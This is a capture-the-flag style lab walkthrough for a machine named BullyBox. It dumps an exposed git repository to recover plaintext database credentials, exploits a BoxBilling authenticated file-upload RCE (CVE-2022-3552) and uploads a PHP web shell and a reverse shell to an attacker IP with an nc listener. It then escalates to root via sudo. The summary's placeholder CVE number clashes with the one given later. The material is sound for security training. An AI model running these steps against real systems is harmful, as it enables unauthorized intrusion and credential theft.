Summary

This lab demonstrates exploiting a git directory exposure to retrieve sensitive configuration files, including database credentials. Using these credentials, learners log into the BoxBilling admin panel and exploit an authenticated RCE vulnerability (CVE-2022-XXXX). Privilege escalation is achieved as the compromised user yuki is part of the sudo group, enabling direct root access. This lab highlights misconfigured git repositories, web exploitation, and privilege escalation via sudo permissions.

Learning Objectives

After completion of this lab, learners will be able to:

Enumerate services and discover the exposed git directory on the web server.
Use git-dumper to download the repository and retrieve sensitive files like bb-config.php.
Extract database credentials and log into the BoxBilling admin panel.
Exploit the RCE vulnerability by uploading a PHP web shell and executing commands.
Gain a reverse shell as the yuki user, and escalate to root using sudo su.



```sh
sudo sh -c "echo '192.168.60.27 BULLYBOX' >> /etc/hosts"
sudo sh -c "echo '192.168.60.27 BULLYBOX.local' >> /etc/hosts"

```

```

???(kali?kali)-[~]
??$ nmap -sV -sC -T4 -oA initial 192.168.58.27
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-10 17:54 +0000
Nmap scan report for 192.168.58.27
Host is up (0.00068s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel




```

http://bullybox.local/.git/HEAD

```

pipx install git-dumper

git-dumper http://bullybox.local/.git git-loot

cd git-loot/

```

```php
  array (
    'type' => 'mysql',
    'host' => 'localhost',
    'name' => 'boxbilling',
    'user' => 'admin',
    'password' => 'Playing-Unstylish7-Provided',
    # admin@bullybox.local
  ),

```

http://bullybox.local/bb-admin

```sh
admin@bullybox.local
Playing-Unstylish7-Provided
```

now, we need to find an authenticated RCE exploit for BoxBilling.

```sh
searchsploit boxbilling
# php/webapps/51108.txt

searchsploit -p 51108
# /usr/share/exploitdb/exploits/php/webapps/51108.txt

cp /usr/share/exploitdb/exploits/php/webapps/51108.txt ./
```

```http
# Exploit Title: BoxBilling<=4.22.1.5 - Remote Code Execution (RCE)
# Date: 2022-09-18
# Exploit Author: zetc0de
# Vendor Homepage: https://www.boxbilling.org/
# Software Link:
https://github.com/boxbilling/boxbilling/releases/download/4.22.1.5/BoxBilling.zip
# Version: <=4.22.1.5 (Latest)
# Tested on: Windows 10
# CVE : CVE-2022-3552
# BoxBilling was vulnerable to Unrestricted File Upload.
# In order to exploit the vulnerability, an attacker must have a valid
authenticated session as admin on the CMS.
# With at least 1 order of product an attacker can upload malicious file to
hidden API endpoint that contain a webshell and get RCE
###################################################################################


## POC
POST /index.php?_url=/api/admin/Filemanager/save_file HTTP/1.1
Host: local.com:8089
Content-Length: 52
Accept: application/json, text/javascript, */*; q=0.01
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=3nrf9i4mv28o5anva77ltq042d
Connection: close

order_id=1&path=ax.php&data=<%3fphp+phpinfo()%3b%3f>

POC Video :
https://drive.google.com/file/d/1m2glCeJ9QXc8epuY2QfvbWwjLTJ8_Hjx/view?usp=sharing
```

we need to prepare a PHP webshell.

```sh
ls /usr/share/webshells/php/

cp /usr/share/webshells/php/php-backdoor.php ./
# ?c=pwd parameter

# edit test.php
http://bullybox.local/bb-admin/filemanager

http://bullybox.local/test.php
```

CTRL-S doesn't work on the filemanager page, we need to use Burp Suite.


Now CTRL-S works! let's try it.

```
http://bullybox.local/test.php?c=ls
```

a bit janky. let's use a simpler reverse shell file.

```sh
ls /usr/share/webshells/php/php-reverse-shell.php
cp /usr/share/webshells/php/php-reverse-shell.php ./

# edit file
ip a|grep 192 #get ip of attacker


$ip = '192.168.49.60';  // CHANGE THIS
$port = 4444;       // CHANGE THIS

# start rev shell listener
nc -nvlp 4444

# visit site after uploading file
curl -vvvk http://bullybox.local/php-reverse-shell.php


# stabilize shell
which python3

python3 -c 'import pty; pty.spawn("/bin/bash")'
```

we get reverse shell. great.

we are a sudoer, so

```sh
sudo bash
```

we get root.